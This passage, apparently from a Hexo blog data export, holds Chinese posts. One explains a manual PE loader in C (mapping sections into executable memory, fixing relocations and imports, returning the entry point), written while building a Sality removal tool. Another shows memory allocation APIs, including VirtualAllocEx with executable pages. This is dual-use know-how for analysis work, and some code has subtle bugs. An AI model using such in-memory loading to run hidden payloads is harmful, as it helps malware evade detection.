lpMemBuffer)\n{\n\t//////////////////////////////////////////////////////////////////////////\n\t////修改ImageBase，返回入口点                                           ///\n\t//////////////////////////////////////////////////////////////////////////\n\tPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n\tPIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos->e_lfanew);\n\tpNt->OptionalHeader.ImageBase = lpMemBuffer;\n\t\n\treturn lpMemBuffer + pNt->OptionalHeader.AddressOfEntryPoint;\n}\n```\n\n返回这个被加载程序的入口地址，直接调用就好\n\n\n\n吃水不忘挖井人 参考来源\nhttps://bbs.pediy.com/thread-249133.htm\n\n","slug":"简单PE加载器","published":1,"updated":"2020-03-02T02:28:20.639Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c0028ccuqdqnx0c4z","content":"<p>思路来源写<code>Sality</code>感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。</p>\n<p>很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思</p>\n<p>下面就是如何加载一个PE，再展开，最后修复执行的过程 </p>\n<p>该函数主要是为了将文件映射到内存中，保证源程序安全</p>\n<p>返回值是未展开文件在内存中的位置</p>\n<pre><code class=\"C\">LPBYTE LoadFileToMem(LPCSTR lpFilePath)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////将源文件读到内存中                                                  ///\n    //////////////////////////////////////////////////////////////////////////\n    DWORD FileSize = 0;\n    LPBYTE Buff = NULL;\n\n    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (hFile == INVALID_HANDLE_VALUE)\n    {\n        printf(&quot;打开文件句柄错误！[%x]&quot;, GetLastError());\n        return -1;\n    }\n\n    FileSize = GetFileSize(hFile, NULL);\n\n    Buff = (LPBYTE)malloc(FileSize);\n    if (Buff == NULL)\n    {\n        printf(&quot;空间申请失败![%x]&quot;, GetLastError());\n        return -1;\n    }\n\n    if (!ReadFile(hFile, Buff, FileSize, &amp;FileSize, NULL))\n    {\n        printf(&quot;ReadFile![%x]&quot;, GetLastError());\n        return -1;\n    }\n    return Buff;\n}</code></pre>\n<p>接下来按照各个节的对齐粒度展开<br>返回值是展开后什么都没修复的buff指针</p>\n<pre><code class=\"C\">LPBYTE Extension(LPBYTE lpFileBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////将文件在内存中展开                                                  ///\n    //////////////////////////////////////////////////////////////////////////\n    int i = 0; \n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpFileBuffer + pDos-&gt;e_lfanew);\n    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS));\n\n    DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage;\n\n    //LPBYTE lpMemBuffer = (LPBYTE)malloc(ImageSize);\n    LPVOID lpMemBuffer = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    VirtualProtect(lpMemBuffer, ImageSize, PAGE_EXECUTE_READWRITE, NULL);//这一句可以不要，上面申请的就是可读可写可执行的空间。\n\n    ZeroMemory(lpMemBuffer, ImageSize);\n\n    //文件头的大小\n    DWORD dwSizeOfHeader = pNt-&gt;OptionalHeader.SizeOfHeaders;\n\n    //将头部拷贝过去\n    CopyMemory(lpMemBuffer, lpFileBuffer, dwSizeOfHeader);\n\n\n    for (;i &lt; pNt-&gt;FileHeader.NumberOfSections;i++)\n    {\n        if (pSec-&gt;VirtualAddress == 0 || pSec-&gt;PointerToRawData == 0)\n        {\n            pSec++;\n            continue;\n        }\n        CopyMemory((LPBYTE)lpMemBuffer + pSec-&gt;VirtualAddress, lpFileBuffer + pSec-&gt;PointerToRawData, pSec-&gt;SizeOfRawData);\n        pSec++;\n    }\n\n    //已经完全映射，可以把之前的内存释放掉了\n    free(lpFileBuffer);\n    return lpMemBuffer;\n}</code></pre>\n<p>修复重定位信息</p>\n<p>这一步容易出错，核心原理是重定位表中存的是这个程序需要修复的数据，每个数据都是<code>DWORD</code>类型的<br>可以参考如下地址，主要要注意 <code>pReloca-&gt;VirtualAddress</code>存的是页基质 , <code>pReloca-&gt;SizeOfBlock</code> 包含了<code>IMAGE_BASE_RELOCATION</code> 结构的大小<br><a href=\"https://blog.csdn.net/Apollon_krj/article/details/77370452\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Apollon_krj/article/details/77370452</a></p>\n<pre><code class=\"C\">BOOL ReRloc(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修复重定位表                                                       ///\n    ////原理：遍历重定位表，计算需要重定位数据的地址：重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址\n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    //获得重定位表\n    PIMAGE_BASE_RELOCATION pReloca = (PIMAGE_BASE_RELOCATION)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n\n    //如果重定位表为空，上述表达式为pDos+0\n    if ((LPBYTE)pReloca == lpMemBuffer)\n    {\n        printf(&quot;没有重定位表！\\n&quot;);\n        return TRUE;\n    }\n\n    while (pReloca-&gt;VirtualAddress !=0 &amp;&amp; pReloca-&gt;SizeOfBlock !=0 )\n    {\n        LPWORD pRelData =  (LPBYTE)pReloca + sizeof(IMAGE_BASE_RELOCATION);\n        int nNumRel = (pReloca-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n        for (int i = 0; i &lt; nNumRel; i++)\n        {\n            // 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。\n            // 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。\n\n            if ((WORD)(pRelData[i] &amp; 0xF000) == 0x3000) //这是一个需要修正的地址\n            {\n                //pReloca-&gt;VirtualAddress存的是页基质，(一个页4K，所以是0xFFF，刚好12位)\n                LPDWORD pAddress = (LPDWORD)(lpMemBuffer + pReloca-&gt;VirtualAddress + (pRelData[i] &amp; 0x0FFF));\n\n\n                *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos;\n\n                printf(&quot;Check!&quot;);\n                //DWORD dwDelta = (DWORD)pDos - pNt-&gt;OptionalHeader.ImageBase;\n                //*pAddress += dwDelta;\n            }\n        }\n        pReloca = (LPBYTE)pReloca + pReloca-&gt;SizeOfBlock;\n    }\n    printf(&quot;重定位表修复完成！\\n&quot;);\n    return TRUE;\n}\n</code></pre>\n<p>修复IAT 这一步也是必须的，在很多壳中是对IAT表进行了Hook，了解一下结构</p>\n<p><code>WinNt.h</code>中定义的<code>IMAGE_IMPORT_DESCRIPTOR</code>结构</p>\n<pre><code class=\"C\">typedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union {                                 //注意这是union\n        DWORD   Characteristics;            // 0 for terminating null import descriptor\n        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n    } DUMMYUNIONNAME;\n    DWORD   TimeDateStamp;                  // 0 if not bound,\n                                            // -1 if bound, and real date\\time stamp\n                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                            // O.W. date/time stamp of DLL bound to (Old BIND)\n\n    DWORD   ForwarderChain;                 // -1 if no forwarders\n    DWORD   Name;\n    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)\n} IMAGE_IMPORT_DESCRIPTOR;\ntypedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre>\n<p><code>OriginalFirstThunk</code> 和 <code>FirstThunk</code> 都指向一个 <code>IMAGE_THUNK_DATA32</code> 结构，该结构是以<code>0</code> 结尾</p>\n<p><code>OriginalFirstThunk</code> 是一直不会被修改，程序构建好后就固定 INT<br><code>FirstThunk</code> 在程序加载时动态修改为具体的函数地址，也就是我们常说的IAT</p>\n<pre><code class=\"C\">typedef struct _IMAGE_THUNK_DATA32 {\n    union {\n        DWORD ForwarderString;      // PBYTE \n        DWORD Function;             // PDWORD\n        DWORD Ordinal;\n        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n    } u1;\n} IMAGE_THUNK_DATA32;\ntypedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</code></pre>\n<p>根据Ordinal的值，判断是按序号导入还是按名称导入，如果是按名称导入则需要去<code>AddressOfData</code>指向的<code>IMAGE_IMPORT_BY_NAME</code>结构中去拿到导入函数名</p>\n<pre><code class=\"C\">typedef struct _IMAGE_IMPORT_BY_NAME {\n    WORD    Hint;\n    CHAR   Name[1];                 //保存具体导入函数的名称\n} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre>\n<p>如果是序号导入就根据<code>Ordinal</code>的<code>低16</code>位决定</p>\n<p><a href=\"https://www.cnblogs.com/night-ride-depart/p/5776107.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/night-ride-depart/p/5776107.html</a></p>\n<pre><code class=\"C\">BOOL InitIAT(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修复IAT                                                            \n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    PIMAGE_IMPORT_DESCRIPTOR pImportTalbe = (PIMAGE_IMPORT_DESCRIPTOR)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n    LPCSTR szDllname = NULL;\n    PIMAGE_THUNK_DATA lpOrgNameArry = NULL;\n    PIMAGE_THUNK_DATA lpFirNameArry = NULL;\n    PIMAGE_IMPORT_BY_NAME lpImportByNameTable = NULL;\n    HMODULE hMou;\n    FARPROC Funaddr;\n    int i = 0;\n\n    while (pImportTalbe-&gt;OriginalFirstThunk)\n    {\n        szDllname = lpMemBuffer + pImportTalbe-&gt;Name;\n        hMou = GetModuleHandleA(szDllname);\n        if (hMou == NULL)\n        {\n            hMou = LoadLibraryA(szDllname);\n            if (hMou == NULL)\n            {\n                printf(&quot;加载%s失败！[%x]\\n &quot;, szDllname, GetLastError());\n                return FALSE;\n            }\n        }\n\n        //dll加载成功，开始导入需要的函数\n        lpOrgNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;OriginalFirstThunk);\n\n        lpFirNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;FirstThunk);\n\n        i = 0;\n\n        while (lpOrgNameArry[i].u1.AddressOfData)\n        {\n            lpImportByNameTable = (PIMAGE_IMPORT_BY_NAME)(lpMemBuffer + lpOrgNameArry[i].u1.AddressOfData);\n\n            if (lpOrgNameArry[i].u1.Ordinal &amp; 0x80000000 == 1)\n            {\n                //序号导入\n                Funaddr = GetProcAddress(hMou, (LPSTR)(lpOrgNameArry[i].u1.Ordinal &amp; 0xFFFF));\n            }\n            else\n            {\n                //名称导入\n                Funaddr = GetProcAddress(hMou, lpImportByNameTable-&gt;Name);\n            }\n\n            lpFirNameArry[i].u1.Function = Funaddr;\n            i++;\n        }\n        pImportTalbe++;\n    }\n    return TRUE;\n}</code></pre>\n<p>最后就是修复<code>ImageBase</code></p>\n<pre><code class=\"C\">FARPROC InitEnv(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修改ImageBase，返回入口点                                           ///\n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    pNt-&gt;OptionalHeader.ImageBase = lpMemBuffer;\n\n    return lpMemBuffer + pNt-&gt;OptionalHeader.AddressOfEntryPoint;\n}</code></pre>\n<p>返回这个被加载程序的入口地址，直接调用就好</p>\n<p>吃水不忘挖井人 参考来源<br><a href=\"https://bbs.pediy.com/thread-249133.htm\" target=\"_blank\" rel=\"noopener\">https://bbs.pediy.com/thread-249133.htm</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>思路来源写<code>Sality</code>感染型病毒专杀时指令被严重混淆，通过加载PE 修改内存 跑一下解密算法效率是最高的。</p>\n<p>很多病毒在运行的时候都会加载另一个主映像文件去执行，而不是创建进程，就很有意思</p>\n<p>下面就是如何加载一个PE，再展开，最后修复执行的过程 </p>\n<p>该函数主要是为了将文件映射到内存中，保证源程序安全</p>\n<p>返回值是未展开文件在内存中的位置</p>\n<pre><code class=\"C\">LPBYTE LoadFileToMem(LPCSTR lpFilePath)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////将源文件读到内存中                                                  ///\n    //////////////////////////////////////////////////////////////////////////\n    DWORD FileSize = 0;\n    LPBYTE Buff = NULL;\n\n    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (hFile == INVALID_HANDLE_VALUE)\n    {\n        printf(&quot;打开文件句柄错误！[%x]&quot;, GetLastError());\n        return -1;\n    }\n\n    FileSize = GetFileSize(hFile, NULL);\n\n    Buff = (LPBYTE)malloc(FileSize);\n    if (Buff == NULL)\n    {\n        printf(&quot;空间申请失败![%x]&quot;, GetLastError());\n        return -1;\n    }\n\n    if (!ReadFile(hFile, Buff, FileSize, &amp;FileSize, NULL))\n    {\n        printf(&quot;ReadFile![%x]&quot;, GetLastError());\n        return -1;\n    }\n    return Buff;\n}</code></pre>\n<p>接下来按照各个节的对齐粒度展开<br>返回值是展开后什么都没修复的buff指针</p>\n<pre><code class=\"C\">LPBYTE Extension(LPBYTE lpFileBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////将文件在内存中展开                                                  ///\n    //////////////////////////////////////////////////////////////////////////\n    int i = 0; \n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpFileBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpFileBuffer + pDos-&gt;e_lfanew);\n    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS));\n\n    DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage;\n\n    //LPBYTE lpMemBuffer = (LPBYTE)malloc(ImageSize);\n    LPVOID lpMemBuffer = VirtualAlloc(NULL, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    VirtualProtect(lpMemBuffer, ImageSize, PAGE_EXECUTE_READWRITE, NULL);//这一句可以不要，上面申请的就是可读可写可执行的空间。\n\n    ZeroMemory(lpMemBuffer, ImageSize);\n\n    //文件头的大小\n    DWORD dwSizeOfHeader = pNt-&gt;OptionalHeader.SizeOfHeaders;\n\n    //将头部拷贝过去\n    CopyMemory(lpMemBuffer, lpFileBuffer, dwSizeOfHeader);\n\n\n    for (;i &lt; pNt-&gt;FileHeader.NumberOfSections;i++)\n    {\n        if (pSec-&gt;VirtualAddress == 0 || pSec-&gt;PointerToRawData == 0)\n        {\n            pSec++;\n            continue;\n        }\n        CopyMemory((LPBYTE)lpMemBuffer + pSec-&gt;VirtualAddress, lpFileBuffer + pSec-&gt;PointerToRawData, pSec-&gt;SizeOfRawData);\n        pSec++;\n    }\n\n    //已经完全映射，可以把之前的内存释放掉了\n    free(lpFileBuffer);\n    return lpMemBuffer;\n}</code></pre>\n<p>修复重定位信息</p>\n<p>这一步容易出错，核心原理是重定位表中存的是这个程序需要修复的数据，每个数据都是<code>DWORD</code>类型的<br>可以参考如下地址，主要要注意 <code>pReloca-&gt;VirtualAddress</code>存的是页基质 , <code>pReloca-&gt;SizeOfBlock</code> 包含了<code>IMAGE_BASE_RELOCATION</code> 结构的大小<br><a href=\"https://blog.csdn.net/Apollon_krj/article/details/77370452\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Apollon_krj/article/details/77370452</a></p>\n<pre><code class=\"C\">BOOL ReRloc(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修复重定位表                                                       ///\n    ////原理：遍历重定位表，计算需要重定位数据的地址：重定位后的地址 = 需要重定位的地址 - 默认加载基址 + 当前加载基址\n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    //获得重定位表\n    PIMAGE_BASE_RELOCATION pReloca = (PIMAGE_BASE_RELOCATION)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\n\n    //如果重定位表为空，上述表达式为pDos+0\n    if ((LPBYTE)pReloca == lpMemBuffer)\n    {\n        printf(&quot;没有重定位表！\\n&quot;);\n        return TRUE;\n    }\n\n    while (pReloca-&gt;VirtualAddress !=0 &amp;&amp; pReloca-&gt;SizeOfBlock !=0 )\n    {\n        LPWORD pRelData =  (LPBYTE)pReloca + sizeof(IMAGE_BASE_RELOCATION);\n        int nNumRel = (pReloca-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n        for (int i = 0; i &lt; nNumRel; i++)\n        {\n            // 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。\n            // 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。\n\n            if ((WORD)(pRelData[i] &amp; 0xF000) == 0x3000) //这是一个需要修正的地址\n            {\n                //pReloca-&gt;VirtualAddress存的是页基质，(一个页4K，所以是0xFFF，刚好12位)\n                LPDWORD pAddress = (LPDWORD)(lpMemBuffer + pReloca-&gt;VirtualAddress + (pRelData[i] &amp; 0x0FFF));\n\n\n                *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos;\n\n                printf(&quot;Check!&quot;);\n                //DWORD dwDelta = (DWORD)pDos - pNt-&gt;OptionalHeader.ImageBase;\n                //*pAddress += dwDelta;\n            }\n        }\n        pReloca = (LPBYTE)pReloca + pReloca-&gt;SizeOfBlock;\n    }\n    printf(&quot;重定位表修复完成！\\n&quot;);\n    return TRUE;\n}\n</code></pre>\n<p>修复IAT 这一步也是必须的，在很多壳中是对IAT表进行了Hook，了解一下结构</p>\n<p><code>WinNt.h</code>中定义的<code>IMAGE_IMPORT_DESCRIPTOR</code>结构</p>\n<pre><code class=\"C\">typedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union {                                 //注意这是union\n        DWORD   Characteristics;            // 0 for terminating null import descriptor\n        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)\n    } DUMMYUNIONNAME;\n    DWORD   TimeDateStamp;                  // 0 if not bound,\n                                            // -1 if bound, and real date\\time stamp\n                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)\n                                            // O.W. date/time stamp of DLL bound to (Old BIND)\n\n    DWORD   ForwarderChain;                 // -1 if no forwarders\n    DWORD   Name;\n    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)\n} IMAGE_IMPORT_DESCRIPTOR;\ntypedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre>\n<p><code>OriginalFirstThunk</code> 和 <code>FirstThunk</code> 都指向一个 <code>IMAGE_THUNK_DATA32</code> 结构，该结构是以<code>0</code> 结尾</p>\n<p><code>OriginalFirstThunk</code> 是一直不会被修改，程序构建好后就固定 INT<br><code>FirstThunk</code> 在程序加载时动态修改为具体的函数地址，也就是我们常说的IAT</p>\n<pre><code class=\"C\">typedef struct _IMAGE_THUNK_DATA32 {\n    union {\n        DWORD ForwarderString;      // PBYTE \n        DWORD Function;             // PDWORD\n        DWORD Ordinal;\n        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME\n    } u1;\n} IMAGE_THUNK_DATA32;\ntypedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</code></pre>\n<p>根据Ordinal的值，判断是按序号导入还是按名称导入，如果是按名称导入则需要去<code>AddressOfData</code>指向的<code>IMAGE_IMPORT_BY_NAME</code>结构中去拿到导入函数名</p>\n<pre><code class=\"C\">typedef struct _IMAGE_IMPORT_BY_NAME {\n    WORD    Hint;\n    CHAR   Name[1];                 //保存具体导入函数的名称\n} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</code></pre>\n<p>如果是序号导入就根据<code>Ordinal</code>的<code>低16</code>位决定</p>\n<p><a href=\"https://www.cnblogs.com/night-ride-depart/p/5776107.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/night-ride-depart/p/5776107.html</a></p>\n<pre><code class=\"C\">BOOL InitIAT(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修复IAT                                                            \n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    PIMAGE_IMPORT_DESCRIPTOR pImportTalbe = (PIMAGE_IMPORT_DESCRIPTOR)(lpMemBuffer + pNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n    LPCSTR szDllname = NULL;\n    PIMAGE_THUNK_DATA lpOrgNameArry = NULL;\n    PIMAGE_THUNK_DATA lpFirNameArry = NULL;\n    PIMAGE_IMPORT_BY_NAME lpImportByNameTable = NULL;\n    HMODULE hMou;\n    FARPROC Funaddr;\n    int i = 0;\n\n    while (pImportTalbe-&gt;OriginalFirstThunk)\n    {\n        szDllname = lpMemBuffer + pImportTalbe-&gt;Name;\n        hMou = GetModuleHandleA(szDllname);\n        if (hMou == NULL)\n        {\n            hMou = LoadLibraryA(szDllname);\n            if (hMou == NULL)\n            {\n                printf(&quot;加载%s失败！[%x]\\n &quot;, szDllname, GetLastError());\n                return FALSE;\n            }\n        }\n\n        //dll加载成功，开始导入需要的函数\n        lpOrgNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;OriginalFirstThunk);\n\n        lpFirNameArry = (PIMAGE_THUNK_DATA)(lpMemBuffer + pImportTalbe-&gt;FirstThunk);\n\n        i = 0;\n\n        while (lpOrgNameArry[i].u1.AddressOfData)\n        {\n            lpImportByNameTable = (PIMAGE_IMPORT_BY_NAME)(lpMemBuffer + lpOrgNameArry[i].u1.AddressOfData);\n\n            if (lpOrgNameArry[i].u1.Ordinal &amp; 0x80000000 == 1)\n            {\n                //序号导入\n                Funaddr = GetProcAddress(hMou, (LPSTR)(lpOrgNameArry[i].u1.Ordinal &amp; 0xFFFF));\n            }\n            else\n            {\n                //名称导入\n                Funaddr = GetProcAddress(hMou, lpImportByNameTable-&gt;Name);\n            }\n\n            lpFirNameArry[i].u1.Function = Funaddr;\n            i++;\n        }\n        pImportTalbe++;\n    }\n    return TRUE;\n}</code></pre>\n<p>最后就是修复<code>ImageBase</code></p>\n<pre><code class=\"C\">FARPROC InitEnv(LPBYTE lpMemBuffer)\n{\n    //////////////////////////////////////////////////////////////////////////\n    ////修改ImageBase，返回入口点                                           ///\n    //////////////////////////////////////////////////////////////////////////\n    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpMemBuffer;\n    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(lpMemBuffer + pDos-&gt;e_lfanew);\n    pNt-&gt;OptionalHeader.ImageBase = lpMemBuffer;\n\n    return lpMemBuffer + pNt-&gt;OptionalHeader.AddressOfEntryPoint;\n}</code></pre>\n<p>返回这个被加载程序的入口地址，直接调用就好</p>\n<p>吃水不忘挖井人 参考来源<br><a href=\"https://bbs.pediy.com/thread-249133.htm\" target=\"_blank\" rel=\"noopener\">https://bbs.pediy.com/thread-249133.htm</a></p>\n"},{"title":"申请内存","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png","_content":"\n\n\n### 三种内存分配例子使用\n\n#### malloc\n\n**C运行库中的动态内存分配函数**，用的较少，在C中常见\n\n申请堆中的空间使用，释放使用**free**\n\nexp：\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n\nint main(void)\n{\n\tchar* string;\n\n\tstring = malloc(1024);\n\n\tif (string == NULL)\n\t\tprintf(\"Insufficient memory available\\n\");\n\telse\n\t{\n\t\tprintf(\"Memory space allocated for path name\\n\");\n\t\tfree(string);\n\t\tprintf(\"Memory freed\\n\");\n\t}\n}\n```\n\n\n\n### new\n\n\n\n平常中申请动态内存时用的API\n\n\n\n```\n#include <Windows.h>\n#include <stdio.h>\n\nint main()\n{\n\n\tchar* p = NULL;\n\tchar s[] = \"Hello world!\";\n\tp = new char[1024];\n\tif (!p)\n\t{\n\t\tprintf(\"Mem Alloc Failed!\\n\");\n\t\treturn 0;\n\t}\n\tZeroMemory(p, 1024);\n\tmemcpy(p, s, strlen(s));\n\tprintf(\"Mem Info -> %s \\n\", p);\n\tdelete[] p;\n\tp = NULL;\n\treturn 0;\n}\n```\n\n\n\n### virtualAlloc和virtualAllocEx\n\nvirtualAlloc 申请自己的内存\n\nvirtualAllocEx 可以指定进程申请\n\n这个比较常用有特殊需求的内存时，比如要申请可以执行内存\n\n```c++\n\tHANDLE hProcess = NULL;\n\tLPVOID p =  VirtualAllocEx(hProcess, NULL,1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tVirtualFreeEx(hProcess, p, 1024, MEM_RELEASE | MEM_DECOMMIT);\n\n```\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/申请内存常见.md","raw":"---\ntitle: 申请内存\ntags: [汇编]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/codeorg2019_social.png\n---\n\n\n\n### 三种内存分配例子使用\n\n#### malloc\n\n**C运行库中的动态内存分配函数**，用的较少，在C中常见\n\n申请堆中的空间使用，释放使用**free**\n\nexp：\n\n```c\n#include <stdio.h>\n#include <malloc.h>\n\nint main(void)\n{\n\tchar* string;\n\n\tstring = malloc(1024);\n\n\tif (string == NULL)\n\t\tprintf(\"Insufficient memory available\\n\");\n\telse\n\t{\n\t\tprintf(\"Memory space allocated for path name\\n\");\n\t\tfree(string);\n\t\tprintf(\"Memory freed\\n\");\n\t}\n}\n```\n\n\n\n### new\n\n\n\n平常中申请动态内存时用的API\n\n\n\n```\n#include <Windows.h>\n#include <stdio.h>\n\nint main()\n{\n\n\tchar* p = NULL;\n\tchar s[] = \"Hello world!\";\n\tp = new char[1024];\n\tif (!p)\n\t{\n\t\tprintf(\"Mem Alloc Failed!\\n\");\n\t\treturn 0;\n\t}\n\tZeroMemory(p, 1024);\n\tmemcpy(p, s, strlen(s));\n\tprintf(\"Mem Info -> %s \\n\", p);\n\tdelete[] p;\n\tp = NULL;\n\treturn 0;\n}\n```\n\n\n\n### virtualAlloc和virtualAllocEx\n\nvirtualAlloc 申请自己的内存\n\nvirtualAllocEx 可以指定进程申请\n\n这个比较常用有特殊需求的内存时，比如要申请可以执行内存\n\n```c++\n\tHANDLE hProcess = NULL;\n\tLPVOID p =  VirtualAllocEx(hProcess, NULL,1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\tVirtualFreeEx(hProcess, p, 1024, MEM_RELEASE | MEM_DECOMMIT);\n\n```\n\n\n\n\n\n\n\n\n\n\n\n","slug":"申请内存常见","published":1,"date":"2020-03-18T01:26:39.542Z","updated":"2020-03-18T01:53:32.032Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c0029ccuqq5sfk5p5","content":"<h3 id=\"三种内存分配例子使用\"><a href=\"#三种内存分配例子使用\" class=\"headerlink\" title=\"三种内存分配例子使用\"></a>三种内存分配例子使用</h3><h4 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h4><p><strong>C运行库中的动态内存分配函数</strong>，用的较少，在C中常见</p>\n<p>申请堆中的空间使用，释放使用<strong>free</strong></p>\n<p>exp：</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nint main(void)\n{\n    char* string;\n\n    string = malloc(1024);\n\n    if (string == NULL)\n        printf(&quot;Insufficient memory available\\n&quot;);\n    else\n    {\n        printf(&quot;Memory space 